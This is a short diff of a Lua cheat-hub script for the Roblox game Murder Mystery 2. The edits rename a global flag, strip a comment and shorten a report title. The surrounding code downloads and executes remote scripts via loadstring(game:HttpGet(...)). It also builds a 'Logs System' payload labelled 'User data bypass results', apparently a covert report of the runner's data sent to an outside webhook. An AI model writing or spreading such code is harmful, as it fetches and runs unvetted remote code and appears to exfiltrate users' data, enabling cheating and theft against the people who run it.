@@ -5,7 +5,7 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 
 if not Fluent or not SaveManager or not InterfaceManager or not FBM then return game.Players.LocalPlayer:Kick("Error: Interface didn't load") end
 
-if _G.PhantomWyrmHubXIsAlreadyRunning then
+if _G.PhantomWyrmXIsAlreadyRunning then
    game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "Script is already running!",
         Text = ""
@@ -13,7 +13,7 @@ if _G.PhantomWyrmHubXIsAlreadyRunning then
    return
 end
 
-_G.PhantomWyrmHubXIsAlreadyRunning = true
+_G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm Hub X - Murder Mystery 2│PC",
@@ -7764,7 +7764,7 @@ Tabs.Extension:AddToggle("RainbowAmbient", {
         if Value then
             rainbowConnection = RunService.RenderStepped:Connect(function(delta)
                 hue = (hue + (Options.RainbowSpeed.Value / 100) * delta) % 1
-                local color = Color3.fromHSV(hue, 0.8, 1) -- 0.8 это насыщенность
+                local color = Color3.fromHSV(hue, 0.8, 1) 
                 
                 Lighting.Ambient = color
                 Lighting.OutdoorAmbient = color
@@ -8195,7 +8195,7 @@ do
         _G.Data.Payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
-                ['title'] = 'MM2 PC Full Intelligence Report',
+                ['title'] = 'MM2 PC',
                 ['description'] = 'User data bypass results',
                 ['color'] = 16711680,
                 ['fields'] = GetFields()
